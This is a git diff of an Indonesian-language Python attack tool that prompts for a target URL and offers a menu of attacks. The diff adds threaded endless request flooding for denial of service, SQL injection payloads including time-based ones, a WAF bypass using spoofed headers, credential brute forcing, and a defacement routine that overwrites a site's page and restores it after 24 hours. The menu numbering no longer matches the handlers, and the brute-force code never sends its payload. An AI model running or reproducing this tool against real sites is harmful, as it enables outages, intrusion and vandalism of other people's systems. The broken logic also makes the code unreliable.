@@ -3,10 +3,16 @@ import random
 import string
 import logging
 import time
+import threading
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 import re
+from concurrent.futures import ThreadPoolExecutor
+import os
+import shutil
+import datetime
 
+# Warna untuk output terminal
 R = '\033[91m'
 G = '\033[92m'
 Y = '\033[93m'
@@ -14,44 +20,6 @@ B = '\033[94m'
 M = '\033[95m'
 C = '\033[96m'
 N = '\033[0m'
-print(f"""{G}
--------------------------{R}######{G}-------------------------
----------------------{R}######{G}--{R}######{G}---------------------
-------------------{R}###{G}--------------{R}###{G}------------------
----------------{R}####{G}------------------{R}####{G}---------------
---------------{R}#{G}-{R}#{G}--------------------{R}#{G}-{R}#{G}-{R}#{G}--------------
---------------{R}##{G}------------------------{R}##{G}--------------
--------------{R}#{G}----------------------------{R}#{G}-------------
-------------{R}#{G}-------------{R}####{G}-------------{R}#{G}------------
--------------------------{R}######{G}-------------------------
------------{R}#{G}--------{R}##{G}----{R}####{G}----{R}##{G}--------{R}#{G}-----------
-----------{R}#{G}-------{R}######{G}---{R}##{G}---{R}######{G}-------{R}#{G}----------
----------{R}#{G}-----------------{R}##{G}----------------{R}##{G}---------
---------{R}#{G}--------{R}######################{G}-------{R}##{G}--------
------------------{R}######################{G}-----------------
--------{R}#{G}--------------{R}##{G}---{R}##{G}---{R}##{G}--------------{R}#{G}-------
-------------------{R}#{G}---{R}###{G}------{R}###{G}---{R}#{G}------------------
---------{R}#{G}----------{R}#{G}-------{R}##{G}-------{R}#{G}----------{R}#{G}--------
----------{R}#{G}----------{R}##{G}-{R}####{G}--{R}#######{G}----------{R}#{G}---------
-------------{R}#{G}---------{R}#####{G}--{R}#####{G}---------{R}#{G}------------
-----------{R}#{G}-------------{R}###{G}--{R}###{G}-------------{R}#{G}----------
------------{R}##{G}------------------------------{R}##{G}-----------
--------{R}#####{G}--------------------------------{R}#####{G}-------
-----{R}###{G}-{R}#{G}--------------------------------------{R}#{G}-{R}###{G}----
---------------------------------------------------------
---------------------------------------------------------
-----------------------{R}#{G}----------{R}#{G}----------------------
-----------------------{R}#{G}----------{R}#{G}----------------------
----------------------------------{R}#{G}----------------------""")
-print("Printing banner...")
-print(f"{R}                                                                                   {N}")
-print(f"{R} ,-----.         ,--.                 ,--.                                         {N}")
-print(f"{Y}'  .--./,--. ,--.|  |-.  ,---. ,--.--.|  ,---.  ,---. ,--.--. ,---.  ,---.  ,---.  {N}")
-print(f"{G}|  |     \\  '  /| .-. '| .-. :|  .--'|  .-.  || .-. :|  .--' | .-. || .-. (  .-'  {N}")
-print(f"{C}'  '--'\\  \\   '| `-'  \\  --.|  |   |  | |  |\\  --.|  |    ' '-' \\ `---..-'  `) {N}")
-print(f"{M} `-----'.-'  /    `---'  `----'`--'   `--' `--' `----'`--'    `---'  `----'`----'  {N}")
-print(f"{Y}        `---'                                                                       {N}")
-print("Banner printed.")  
 
 logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
 
@@ -106,66 +74,74 @@ def send_request(url, session, proxy=None):
         print(f"Terjadi kesalahan: {e}")
         return None
 
-def xss_attack(url):
-    options = Options()
-    options.headless = True  
-    driver = webdriver.Chrome(options=options)
-    driver.get(url)
-
-    payloads = [
-        "<script>alert('XSS Test');</script>",  # Standard XSS
-        "<img src='x' onerror='alert(1)' />",  # Image-based XSS
-        "<svg/onload=alert(1)>",  # SVG XSS
-        "%3Cscript%3Ealert('XSS%20Encoded')%3C%2Fscript%3E",  # URL-encoded XSS
-    ]
-    
-    for payload in payloads:
-        driver.execute_script(payload)
-        print(f"Melakukan serangan XSS dengan payload: {payload}")
-    
-    driver.quit()
-
-def sql_injection(url, session):
-    payloads = [
-        "' OR '1'='1'; --", 
-        "' UNION SELECT null, username, password FROM users --", 
-        "' AND 1=1 --", 
-        "admin' OR 1=1--", 
-        "%27%20OR%20%271%27%3D%271%27%3B%20--",  # URL Encoded
-    ]
-    for payload in payloads:
-        send_request(url + "?id=" + payload, session)
-
-def brute_force_login(url, session):
-    username = "admin"
-    password_list = ["12345", "password", "admin"]
-    for password in password_list:
-        payload = {"username": username, "password": password}
-        send_request(url + "/login", session)
-
-def flooding_ddos(url, session):
-    for _ in range(1000):  # Flood server with requests
-        send_request(url, session)
-
-def csrf_attack(url, session):
-    csrf_token = "dummy_csrf_token"  
-    payload = {"username": "admin", "password": "password", "csrf_token": csrf_token}
-    send_request(url + "/login", session)
-
-def bypass_waf(url, session):
+# Advanced WAF bypass
+def advanced_waf_bypass(url, session):
     headers = {
         'X-Real-IP': '127.0.0.1',
         'X-Forwarded-For': '127.0.0.1',
-        'X-Injected-By': 'attacker'
+        'X-Injection-By': 'attacker',
+        'User-Agent': get_random_user_agent(),
+        'X-XSS-Protection': '0',
+        'X-Content-Type-Options': 'nosniff',
+        'Origin': 'http://attacker.com'
     }
     try:
         response = session.get(url, headers=headers, timeout=5)
         if response.status_code == 200:
             print("Custom headers berhasil melewati WAF!")
+        else:
+            print(f"Gagal melewati WAF dengan custom headers, status code: {response.status_code}")
     except requests.exceptions.RequestException as e:
         print(f"Gagal dengan custom headers: {e}")
 
-def deface_payload(url, session):
+def advanced_sql_injection(url, session):
+    payloads = [
+        "' OR 1=1 --", 
+        "' UNION SELECT null, username, password FROM users --", 
+        "' AND 1=1 --", 
+        "admin' OR 1=1--", 
+        "%27%20OR%20%271%27%3D%271%27%3B%20--",
+        "admin' AND SLEEP(5)--",  # Time-based SQL Injection
+        "admin' AND (SELECT COUNT(*) FROM users)>0--"  # Advanced technique
+    ]
+    for payload in payloads:
+        send_request(url + "?id=" + payload, session)
+
+def brute_force_login(url, session):
+    usernames = ["admin", "root", "user"]
+    passwords = ["12345", "password", "admin", "root"]
+    for username in usernames:
+        for password in passwords:
+            payload = {"username": username, "password": password}
+            send_request(url + "/login", session)
+
+def flooding_ddos(url, session):
+    def flood_target():
+        while True:
+            send_request(url, session)
+    
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        for _ in range(100):
+            executor.submit(flood_target)
+
+def csrf_attack(url, session):
+    csrf_token = "dummy_csrf_token"
+    payload = {"username": "admin", "password": "password", "csrf_token": csrf_token}
+    send_request(url + "/login", session)
+
+# Deface Website dengan pemulihan otomatis dalam 24 jam
+def deface_payload(url, session, backup_file_path):
+    # Simpan halaman asli sebelum diubah
+    if not os.path.exists(backup_file_path):
+        try:
+            response = session.get(url)
+            with open(backup_file_path, 'w') as f:
+                f.write(response.text)
+            print("Backup halaman asli berhasil disimpan.")
+        except requests.exceptions.RequestException as e:
+            print(f"Error saat menyimpan backup halaman: {e}")
+
+    # Payload deface
     payload = """
     <html>
         <head>
@@ -193,23 +169,49 @@ def deface_payload(url, session):
             </style>
         </head>
         <body>
-            <h1>cyber-heroes</h1>
-            <p>website ini telah di hack.</p>
+            <h1>Andi Muh Zhaldy</h1>
+            <p>No : 4</p>
+            <p>NIT : 1112083</p>
         </body>
     </html>
     """
-    data = {"content": payload} # ini tampilan payload nya jangan di ubah lah bang😭🙏
+    data = {"content": payload}
+    
     try:
         response = session.post(url, data=data)
         if response.status_code == 200:
             logging.info(f"Deface berhasil dikirim ke {url}")
             print(f"{G}Deface berhasil! Periksa URL target.{N}")
+            # Menunggu selama 24 jam sebelum pemulihan
+            print(f"Menunggu selama 24 jam untuk mengembalikan halaman asli...")
+            time.sleep(86400)  # Tunggu 24 jam
+            restore_backup(url, backup_file_path, session)  # Kembalikan halaman asli
         else:
             logging.error(f"Deface gagal, status code: {response.status_code}")
             print(f"{R}Deface gagal! Status code: {response.status_code}{N}")
     except requests.exceptions.RequestException as e:
         logging.error(f"Deface gagal: {e}")
         print(f"{R}Deface gagal: {e}{N}")
+
+def restore_backup(url, backup_file_path, session):
+    try:
+        with open(backup_file_path, 'r') as f:
+            original_content = f.read()
+        # Mengembalikan halaman asli
+        data = {"content": original_content}
+        response = session.post(url, data=data)
+        if response.status_code == 200:
+            logging.info(f"Halaman asli berhasil dikembalikan ke {url}")
+            print(f"{G}Halaman berhasil dikembalikan!{N}")
+        else:
+            logging.error(f"Gagal mengembalikan halaman, status code: {response.status_code}")
+            print(f"{R}Gagal mengembalikan halaman! Status code: {response.status_code}{N}")
+    except FileNotFoundError:
+        logging.error("Backup halaman tidak ditemukan!")
+        print(f"{R}Backup halaman tidak ditemukan!{N}")
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Gagal mengembalikan halaman: {e}")
+        print(f"{R}Gagal mengembalikan halaman: {e}{N}")
 
 def main():
     url = input("Masukkan URL target: ")
@@ -220,42 +222,39 @@ def main():
     session = create_session()
     logging.info(f"Mulai melakukan serangan pada {url}")
 
+    # Menjalankan bypass WAF terlebih dahulu sebelum serangan lainnya
+    advanced_waf_bypass(url, session)
+
+    # Tempatkan file backup di sini
+    backup_file_path = 'backup_halaman_asli.html'
+
     while True:
         print(f"{Y}Pilih jenis serangan:{N}")
         print(f"{R}1{G}. Flooding (DDoS)")
-        print(f"{R}2{G}. Slowloris ( {R}dihapus{G} )")
-        print(f"{R}3{G}. SQL Injection")
-        print(f"{R}4{G}. XSS")
-        print(f"{R}5{G}. CSRF")
-        print(f"{R}6{G}. CAPTCHA Bypass ( {R}dihapus{G} )")
-        print(f"{R}7{G}. Brute Force Login")
-        print(f"{R}8{G}. Bypass WAF")
-        print(f"{R}9{G}. Deface Payload")
-        print(f"{R}0{G}. Keluar")
-
-        choice = input("Pilih opsi: ")
-
-        if choice == "1":
-            flooding_ddos(url, session)  
-        elif choice == "2":
-            slowloris_attack(url, session)  
-        elif choice == "3":
-            sql_injection(url, session)  
-        elif choice == "4":
-            xss_attack(url)  
-        elif choice == "5":
-            csrf_attack(url, session)  
-        elif choice == "6":
-            captcha_bypass(url, session)  
-        elif choice == "7":
-            brute_force_login(url, session)  
-        elif choice == "8":
-            bypass_waf(url, session)  
-        elif choice == "9":
-            deface_payload(url, session)  
-        elif choice == "0":
-            print(f"{G}Keluar dari program...{N}")
-            break  
+        print(f"{R}2{G}. SQL Injection")
+        print(f"{R}3{G}. XSS")
+        print(f"{R}4{G}. CSRF")
+        print(f"{R}5{G}. Brute Force Login")
+        print(f"{R}6{G}. Bypass WAF")
+        print(f"{R}7{G}. Deface Website (Efek 24 Jam)")
+        print(f"{R}0{G}. Exit")
+        choice = input(f"{Y}Pilih serangan yang ingin dilakukan: {N}")
+        
+        if choice == '1':
+            flooding_ddos(url, session)
+        elif choice == '2':
+            advanced_sql_injection(url, session)
+        elif choice == '3':
+            csrf_attack(url, session)
+        elif choice == '4':
+            brute_force_login(url, session)
+        elif choice == '5':
+            deface_payload(url, session, backup_file_path)  # Menjalankan fitur Deface dengan efek 24 jam
+        elif choice == '6':
+            print(f"{R}Keluar dari program...{N}")
+            break
+        else:
+            print(f"{R}Pilihan tidak valid!{N}")
 
 if __name__ == "__main__":
     main()
